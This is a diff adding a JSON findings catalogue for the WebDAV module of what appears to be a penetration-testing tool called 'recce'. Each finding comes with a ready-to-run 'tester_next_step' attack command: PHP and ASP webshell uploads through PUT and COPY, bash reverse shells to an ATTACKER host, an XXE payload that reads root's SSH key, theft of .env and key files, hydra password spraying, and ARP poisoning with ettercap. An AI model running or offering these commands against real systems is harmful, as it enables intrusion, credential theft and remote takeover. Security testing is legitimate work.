@@ -1,0 +1,186 @@
+{
+  "service": "webdav",
+  "module_files": [
+    "recce/services/webdav.py"
+  ],
+  "summary": "webdav.py is a two-tier WebDAV enumerator: passive (OPTIONS/DAV compliance/backend fingerprint/WWW-Authenticate) + active (PROPFIND depth, MKCOL/COPY/MOVE/PROPPATCH/LOCK/UNLOCK write tests, anonymous PUT roundtrip, PROPFIND XXE, If:-header bypass, SVN repo probe, sensitive-href classifier), plus exploit-gated PUT+execute webshell chain and CVE-2017-7269-adjacent COPY/MOVE upload-filter bypass \u2014 every write probe uses randomised /recce_dav_probe_<hex>/ names and cleans up in a try/finally. Reaches genuine T2 in three places (anon PUT proven, PUT\u2192execute proven, COPY bypass proven, PROPFIND XXE with returned file content), and T2 for SVN checkout leaks (source + author list). Biggest gap: no chain from PUT\u2192execute proof into a real reverse-shell drop, and the captured SVN/creator-displayname user list is not auto-fed to the credential-spray queue.",
+  "proposed_shared_surface_consumers": [
+    "known_users",
+    "loot_credentials",
+    "known_paths",
+    "product_versions"
+  ],
+  "findings": [
+    {
+      "kind": "webdav_enabled",
+      "title_pattern": "WebDAV enabled (OPTIONS/PROPFIND accepted)",
+      "tier": "t0",
+      "severity": "low",
+      "tier_evidence": "OPTIONS Allow + PROPFIND multistatus \u2014 surface only.",
+      "can_promote_to": "t1",
+      "promotion_notes": "Immediately runs mount enum + verb probes \u2192 already promoted internally.",
+      "promotion_risk": "none",
+      "tester_next_step": "curl -sSkI -X OPTIONS http://IP:PORT/ | grep -Ei 'allow:|dav:'"
+    },
+    {
+      "kind": "webdav_fingerprint",
+      "title_pattern": "WebDAV backend fingerprint: <product>",
+      "tier": "t0",
+      "severity": "info",
+      "tier_evidence": "Product/version regex match on Server/vendor headers.",
+      "can_promote_to": "t1",
+      "promotion_notes": "Feed product+version into offline CVE DB; IIS 6.0 \u2192 CVE-2017-7269 candidate for the PUT\u2192execute chain.",
+      "promotion_risk": "none",
+      "tester_next_step": "searchsploit iis 6.0 webdav ; msfconsole -q -x 'use exploit/windows/iis/iis_webdav_scstoragepathfromurl'"
+    },
+    {
+      "kind": "webdav_directory_enum",
+      "title_pattern": "WebDAV directory tree disclosed via PROPFIND Depth: infinity",
+      "tier": "t1",
+      "severity": "high",
+      "tier_evidence": "Depth:infinity returns >1 href \u2014 deterministic enum.",
+      "can_promote_to": "t2",
+      "promotion_notes": "GET each sensitive-looking href (already classified via cross_mount_leaks); extracted config/credential content is T2.",
+      "promotion_risk": "low",
+      "tester_next_step": "curl -sSk -X PROPFIND -H 'Depth: infinity' http://IP:PORT/webdav/ | grep -oE '<D:href>[^<]+' ; for h in $(above); do curl -sSk http://IP:PORT$h; done"
+    },
+    {
+      "kind": "webdav_verbs_enabled",
+      "title_pattern": "WebDAV dangerous verbs accepted: <verbs>",
+      "tier": "t1",
+      "severity": "high",
+      "tier_evidence": "verb_allowlist actually sends MKCOL/PROPPATCH/PUT/COPY/MOVE/LOCK and records status; 201/204/207 accepted = deterministic.",
+      "can_promote_to": "t2",
+      "promotion_notes": "Already triggers anonymous_put_proof + put_webshell_chain when the gates fire; the T2 promotion is native.",
+      "promotion_risk": "medium",
+      "tester_next_step": "curl -sSk -X MKCOL http://IP:PORT/recce_probe/ ; curl -sSk -X PUT --data 'x' http://IP:PORT/recce_probe/x.txt ; curl -sSk http://IP:PORT/recce_probe/x.txt ; curl -sSk -X DELETE http://IP:PORT/recce_probe/x.txt"
+    },
+    {
+      "kind": "webdav_mkcol_allowed",
+      "title_pattern": "WebDAV MKCOL - writable collection creation allowed",
+      "tier": "t1",
+      "severity": "high",
+      "tier_evidence": "MKCOL returned 201 \u2014 proven collection created (then cleaned up).",
+      "can_promote_to": "t2",
+      "promotion_notes": "Under the new collection, run copy_move_bypass and put_webshell_chain \u2014 the T2 chain is already wired.",
+      "promotion_risk": "medium",
+      "tester_next_step": "see webdav_verbs_enabled"
+    },
+    {
+      "kind": "webdav_anon_put",
+      "title_pattern": "Anonymous WebDAV PUT - arbitrary file write (proven)",
+      "tier": "t2",
+      "severity": "critical",
+      "tier_evidence": "PUT canary + GET reads back the canary \u2014 deterministic write proof.",
+      "can_promote_to": "t3",
+      "promotion_notes": "Under --upload-shell put_webshell_chain fires; T3 is a real reverse-shell drop the tester triggers with the language-appropriate payload.",
+      "promotion_risk": "destructive",
+      "tester_next_step": "curl -sSk -X PUT --data '<?php system($_GET[c]); ?>' http://IP:PORT/webdav/s.php ; curl -sSk 'http://IP:PORT/webdav/s.php?c=bash -c \"bash -i >& /dev/tcp/ATTACKER/4444 0>&1\"'"
+    },
+    {
+      "kind": "webdav_put_rce",
+      "title_pattern": "WebDAV PUT -> <ext> execution (RCE proven)",
+      "tier": "t2",
+      "severity": "critical",
+      "tier_evidence": "One-liner PUT + GET returned 'recce-rce-<nonce>' from server-computed shell_exec \u2014 plain reflection cannot fake the nonce.",
+      "can_promote_to": "t3",
+      "promotion_notes": "Swap the harmless nonce payload for a persistent reverse shell / bind shell. Cleanup already handled per current DELETE.",
+      "promotion_risk": "destructive",
+      "tester_next_step": "nc -lvnp 4444 & curl -sSk -X PUT --data '<?php exec(\"bash -c \\\"bash -i >& /dev/tcp/ATTACKER/4444 0>&1\\\"\"); ?>' http://IP:PORT/webdav/rev.php ; curl -sSk http://IP:PORT/webdav/rev.php",
+      "related_cves": [
+        "CVE-2017-7269"
+      ]
+    },
+    {
+      "kind": "webdav_copy_bypass",
+      "title_pattern": "WebDAV COPY/MOVE upload-filter bypass",
+      "tier": "t2",
+      "severity": "critical",
+      "tier_evidence": "PUT .txt \u2192 COPY \u2192 .asp/.aspx/.php returns HTTP 200 for the renamed script extension.",
+      "can_promote_to": "t3",
+      "promotion_notes": "PUT the actual webshell body as .txt, COPY to .aspx/.php/.jsp, GET with a command param \u2192 T3 RCE.",
+      "promotion_risk": "destructive",
+      "tester_next_step": "curl -sSk -X PUT --data '<%eval request(\"c\")%>' http://IP:PORT/x.txt ; curl -sSk -X COPY -H 'Destination: http://IP:PORT/x.asp' http://IP:PORT/x.txt ; curl -sSk 'http://IP:PORT/x.asp?c=whoami'"
+    },
+    {
+      "kind": "webdav_xxe",
+      "title_pattern": "WebDAV PROPFIND XML External Entity (XXE)",
+      "tier": "t2",
+      "severity": "high",
+      "tier_evidence": "_XXE_HIT confirms /etc/passwd or win.ini content in the multistatus body \u2014 actual server-side file read.",
+      "can_promote_to": "t3",
+      "promotion_notes": "Follow up with /root/.ssh/id_rsa, /var/www/*/.env; captured SSH key \u2192 SSH pivot is T3.",
+      "promotion_risk": "low",
+      "tester_next_step": "cat > xxe.xml <<'EOF'\\n<?xml version=\"1.0\"?><!DOCTYPE r [<!ENTITY x SYSTEM \"file:///root/.ssh/id_rsa\">]><D:propfind xmlns:D=\"DAV:\"><D:prop><D:displayname>&x;</D:displayname></D:prop></D:propfind>\\nEOF\\ncurl -sSk -X PROPFIND -H 'Content-Type: application/xml' --data-binary @xxe.xml http://IP:PORT/"
+    },
+    {
+      "kind": "webdav_if_header_bypass",
+      "title_pattern": "WebDAV If: header authentication bypass",
+      "tier": "t1",
+      "severity": "high",
+      "tier_evidence": "401 \u2192 207 with bogus If: token \u2014 deterministic canonicalisation bypass.",
+      "can_promote_to": "t2",
+      "promotion_notes": "With bypass proven, replay Depth:infinity + PUT via the If: header \u2192 data disclosure and write reach T2.",
+      "promotion_risk": "medium",
+      "tester_next_step": "curl -sSk -X PROPFIND -H 'If: (<opaquelocktoken:x>)' -H 'Depth: infinity' http://IP:PORT/protected/",
+      "related_cves": [
+        "CVE-2017-7269"
+      ]
+    },
+    {
+      "kind": "webdav_svn_exposed",
+      "title_pattern": "mod_dav_svn repository exposed (anonymous checkout)",
+      "tier": "t1",
+      "severity": "high",
+      "tier_evidence": "GET /!svn/vcc/default or /.svn/entries returned 200 with body.",
+      "can_promote_to": "t2",
+      "promotion_notes": "svn checkout the entire repo, run trufflehog / recce loot regex \u2192 captured secrets = T2; captured commit authors \u2192 known_users spray.",
+      "promotion_risk": "low",
+      "tester_next_step": "svn checkout --non-interactive http://IP:PORT/ /tmp/svnrepo ; svn log /tmp/svnrepo | awk '/^r/{print $3}' | sort -u ; trufflehog filesystem /tmp/svnrepo"
+    },
+    {
+      "kind": "webdav_lock_open",
+      "title_pattern": "WebDAV LOCK accepts unauthenticated lock-null resources",
+      "tier": "t1",
+      "severity": "medium",
+      "tier_evidence": "LOCK against random path returned 200/201/207 unauth.",
+      "can_promote_to": "stay",
+      "promotion_notes": "Lock-null is DoS-flavoured; PUT/MKCOL primitives already probed separately for higher-value promotion.",
+      "promotion_risk": "medium",
+      "tester_next_step": "curl -sSk -X LOCK -H 'Depth: 0' -H 'Timeout: Second-3600' --data '<lockinfo xmlns=\"DAV:\"><lockscope><exclusive/></lockscope><locktype><write/></locktype></lockinfo>' http://IP:PORT/critical/path"
+    },
+    {
+      "kind": "webdav_href_leak",
+      "title_pattern": "WebDAV hrefs disclose sensitive paths",
+      "tier": "t1",
+      "severity": "medium",
+      "tier_evidence": "PROPFIND hrefs matched against _SENSITIVE_HREF (.git, .env, wp-config, backup, id_rsa, ...).",
+      "can_promote_to": "t2",
+      "promotion_notes": "GET each classified sensitive href unauth; captured content \u2192 T2.",
+      "promotion_risk": "low",
+      "tester_next_step": "curl -sSk http://IP:PORT/.env ; curl -sSk http://IP:PORT/backup/dump.sql ; curl -sSk http://IP:PORT/.ssh/id_rsa"
+    },
+    {
+      "kind": "webdav_user_leak",
+      "title_pattern": "WebDAV PROPFIND leaks creator-displayname user list",
+      "tier": "t1",
+      "severity": "low",
+      "tier_evidence": "Distinct <D:creator-displayname> values recovered.",
+      "can_promote_to": "t3",
+      "promotion_notes": "Push user list into known_users; run hydra/nxc with the harvested names against SSH/RDP/SMB/OWA \u2192 T3 credential-lands foothold.",
+      "promotion_risk": "medium",
+      "tester_next_step": "USERS=$(curl -sSk -X PROPFIND -H 'Depth: 1' http://IP:PORT/svn/ | grep -oE '<D:creator-displayname>[^<]+' | sed 's/.*>//') ; echo $USERS > u.txt ; hydra -L u.txt -P /usr/share/wordlists/rockyou.txt ssh://IP -f"
+    },
+    {
+      "kind": "webdav_auth_scheme",
+      "title_pattern": "WebDAV Basic auth over cleartext channel",
+      "tier": "t0",
+      "severity": "medium",
+      "tier_evidence": "WWW-Authenticate: Basic on plain-HTTP \u2014 configuration only.",
+      "can_promote_to": "t3",
+      "promotion_notes": "MitM the credential on the wire (ARP-poison / rogue AP) \u2192 captured plaintext Basic auth is T3 foothold.",
+      "promotion_risk": "destructive",
+      "tester_next_step": "ettercap -T -q -M arp:remote /VICTIM// /GATEWAY// ; grep -Ei 'Authorization: Basic' capture.pcap"
+    }
+  ]
+}
